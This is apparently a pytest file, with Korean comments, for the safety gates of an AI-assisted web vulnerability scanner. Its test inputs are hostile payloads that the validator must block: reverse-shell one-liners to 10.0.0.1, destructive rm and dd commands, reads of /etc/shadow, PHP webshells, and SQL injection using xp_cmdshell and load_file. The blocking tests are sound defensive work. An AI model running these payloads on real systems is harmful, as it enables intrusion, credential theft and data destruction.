"""test_payload_planner_validator.py — AI Payload Planner / Validator / Proof Mode 안전성 검증.

핵심: AI 는 그대로 실행/확정 불가, destructive/shell/webshell/time-based 차단,
RCE 기본 OFF + echo marker 외 차단, 최종 판정은 Rule Engine 만.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import payload_validator as pv
import payload_planner as planner
import proof_mode as pm
import ai_exploit_planning as aep


# ── Validator: 차단 정책 ──────────────────────────────────────────────────────
def test_block_reverse_shell():
    for p in ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
              "nc -e /bin/sh 10.0.0.1 4444", "rm -rf / ; reverse shell"]:
        assert pv.validate_payload(p)["verdict"] in (pv.BLOCKED_SHELL, pv.BLOCKED_DESTRUCTIVE)


def test_block_webshell_and_upload():
    assert pv.validate_payload("<?php system($_GET['c']); ?>", vuln_type="file_upload")["verdict"] == pv.BLOCKED_SHELL
    assert pv.validate_payload("shell.jsp", vuln_type="file_upload")["verdict"] == pv.BLOCKED_SHELL
    assert pv.validate_payload("cmd.aspx", vuln_type="file_upload")["verdict"] == pv.BLOCKED_SHELL
    # 코드 실행 함수형 웹쉘은 업로드 아닌 일반 컨텍스트에서도 차단
    assert pv.validate_payload("eval($_POST['x'])")["verdict"] == pv.BLOCKED_SHELL


def test_benign_hello_world_upload_requires_approval():
    v = pv.validate_payload("eoseureum_hello.php: hello world", vuln_type="file_upload")
    assert v["verdict"] == pv.MANUAL_APPROVAL_REQUIRED


def test_block_destructive_commands():
    for p in ["rm -rf /var", "dd if=/dev/zero of=/dev/sda", "chmod 777 /etc",
              "useradd hacker", "cat /etc/shadow"]:
        assert pv.validate_payload(p)["verdict"] == pv.BLOCKED_DESTRUCTIVE


def test_block_sql_dump_osshell_fileread():
    assert pv.validate_payload("'; EXEC xp_cmdshell('dir')--", vuln_type="sqli")["verdict"] == pv.BLOCKED_DESTRUCTIVE
    assert pv.validate_payload("' UNION SELECT load_file('/etc/passwd')--", vuln_type="sqli")["verdict"] == pv.BLOCKED_DESTRUCTIVE
    assert pv.validate_payload("' INTO OUTFILE '/tmp/x'--", vuln_type="sqli")["verdict"] == pv.BLOCKED_DESTRUCTIVE
    for kw in ["DROP TABLE users", "DELETE FROM users", "UPDATE users SET", "INSERT INTO x"]:
        assert pv.validate_payload(f"'; {kw}--", vuln_type="sqli")["verdict"] in (pv.BLOCKED_DESTRUCTIVE, pv.BLOCKED_STATE_CHANGE)


def test_time_based_blocked_by_default(monkeypatch):
    monkeypatch.delenv("ENABLE_TIME_BASED_SQLI", raising=False)
    assert pv.validate_payload("' OR SLEEP(5)--", vuln_type="sqli")["verdict"] == pv.BLOCKED_TIME_BASED
    assert pv.validate_payload("'; WAITFOR DELAY '0:0:5'--", vuln_type="sqli")["verdict"] in (pv.BLOCKED_TIME_BASED, pv.BLOCKED_STATE_CHANGE)


def test_safe_xss_allowed():
    assert pv.validate_payload("<script>alert('EOSEUREUM_XSS_PROOF')</script>", vuln_type="xss")["verdict"] == pv.ALLOWED_SAFE


def test_safe_sqli_allowed():
    assert pv.validate_payload("' OR '1'='1", vuln_type="sqli")["verdict"] == pv.ALLOWED_SAFE
    assert pv.validate_payload("'", vuln_type="sqli")["verdict"] == pv.ALLOWED_SAFE


# ── RCE Proof Mode ────────────────────────────────────────────────────────────
def test_rce_proof_mode_off_by_default(monkeypatch):
    monkeypatch.delenv("RCE_PROOF_MODE", raising=False)
    assert pv._rce_proof_mode() is False
    assert pm.rce_proof_mode_enabled() is False
    # 기본(OFF): cmdi echo marker 도 승인 필요로 보류
    v = pv.validate_payload(f";echo {planner.RCE_ECHO_MARKER}", vuln_type="command_injection")
    assert v["verdict"] == pv.MANUAL_APPROVAL_REQUIRED


def test_rce_proof_mode_on_allows_only_echo_marker(monkeypatch):
    monkeypatch.setenv("RCE_PROOF_MODE", "true")
    # 고정 echo marker 만 허용
    ok = pv.validate_payload(f";echo {planner.RCE_ECHO_MARKER}", vuln_type="command_injection")
    assert ok["verdict"] == pv.ALLOWED_SAFE
    # echo marker 외 명령은 proof mode 라도 차단
    for p in [";id", ";cat /etc/passwd", ";echo something_else", "; whoami"]:
        assert pv.validate_payload(p, vuln_type="command_injection")["verdict"] in (
            pv.BLOCKED_SHELL, pv.BLOCKED_DESTRUCTIVE)


def test_rce_grade_skipped_when_off(monkeypatch):
    monkeypatch.delenv("RCE_PROOF_MODE", raising=False)
    assert pm.grade_rce(echo_reflected=True, observed=pm.RCE_ECHO_MARKER) == pm.SKIPPED_UNSAFE


def test_rce_grade_confirmed_only_marker(monkeypatch):
    monkeypatch.setenv("RCE_PROOF_MODE", "true")
    assert pm.grade_rce(echo_reflected=True, observed=f"x {pm.RCE_ECHO_MARKER} y") == pm.CONFIRMED_RESPONSE
    assert pm.grade_rce(echo_reflected=True, observed="uid=0(root)") == pm.POSSIBLE  # marker 미반사
    assert pm.grade_rce(echo_reflected=False, observed="") == pm.MANUAL_REVIEW


# ── AI 는 판정 불가 / Rule Engine 만 최종 판정 ────────────────────────────────
def test_ai_cannot_create_confirmed():
    raw = {"recommended_payloads": ["<script>alert(1)</script>"], "verdict": "CONFIRMED_BROWSER",
           "confirmed": True, "is_vulnerable": True, "severity_final": "HIGH"}
    clean = planner.sanitize_ai_plan(raw)
    assert "verdict" not in clean and "confirmed" not in clean and "is_vulnerable" not in clean
    assert clean["ai_cannot_confirm"] is True
    assert set(clean["_stripped"]) >= {"verdict", "confirmed", "is_vulnerable"}


def test_rule_engine_only_verdict_gate():
    # AI 출처가 CONFIRMED 류를 주면 강등
    assert pm.assert_rule_engine_verdict(pm.CONFIRMED_BROWSER, "ai") == pm.MANUAL_REVIEW
    assert pm.assert_rule_engine_verdict(pm.CONFIRMED_RESPONSE, "ollama") == pm.MANUAL_REVIEW
    # Rule Engine 출처는 유지
    assert pm.assert_rule_engine_verdict(pm.CONFIRMED_BROWSER, "rule_engine") == pm.CONFIRMED_BROWSER


def test_finalize_verdict_rule_engine_only():
    # XSS alert → CONFIRMED_BROWSER (rule_engine)
    r = pm.finalize_verdict(vuln_type="xss", signals={"alert_fired": True}, source="rule_engine")
    assert r["verdict"] == pm.CONFIRMED_BROWSER
    # 같은 신호라도 AI 출처면 강등
    r2 = pm.finalize_verdict(vuln_type="xss", signals={"alert_fired": True}, source="ai")
    assert r2["verdict"] == pm.MANUAL_REVIEW


# ── Planner: Validator 통과한 것만 실행 계획에 포함 ───────────────────────────
def test_execution_plan_only_allowed():
    point = {"url": "http://t/s?q=1", "method": "GET", "param": "q", "context": "search",
             "input_type": "text"}
    plan = planner.plan_for_input(point, 0)
    # 실행 계획의 모든 항목은 ALLOWED 였어야 한다
    allowed_payloads = {e["payload"] for e in plan["execution_plan"]}
    blocked = [c for c in plan["payload_candidates"] if c["verdict"] != pv.ALLOWED_SAFE]
    for b in blocked:
        assert b["payload"] not in allowed_payloads or b["vuln_type"] != _vt_of(allowed_payloads, b)
    assert plan["validator_result"]["total"] >= len(plan["execution_plan"])
    assert plan["ai_cannot_confirm"] is True


def _vt_of(_a, _b):
    return _b["vuln_type"]


def test_build_plan_summary_counts():
    pts = [
        {"url": "http://t/login", "method": "POST", "param": "username", "context": "login",
         "input_type": "text", "authenticated": False},
        {"url": "http://t/view", "method": "GET", "param": "id", "context": "generic",
         "input_type": "text", "authenticated": True},
    ]
    plan = aep.build_plan(pts)
    s = plan["summary"]
    assert s["total_input_points"] == 2
    assert s["ai_payload_candidates"] >= 1
    assert s["validator_passed"] + s["validator_blocked"] == s["ai_payload_candidates"]
    # 인증 후 IDOR 등 critical 후보가 잡혀야 한다
    assert s["critical_candidates"] >= 1
    assert s["rce_proof_mode"] is False  # 기본 OFF


def test_merge_executed_verdicts():
    plan = aep.build_plan([{"url": "http://t/s", "method": "GET", "param": "q", "context": "search"}])
    findings = [{"confidence": "CONFIRMED_BROWSER"}, {"confidence": "POSSIBLE"}]
    disc = [{"confidence": "MANUAL_REVIEW"}]
    aep.merge_executed_verdicts(plan, findings, discovery=disc)
    assert plan["summary"]["confirmed"] == 1
    assert plan["summary"]["possible"] == 1
    assert plan["summary"]["manual_review"] == 1
    assert plan["summary"]["executed"] == 2
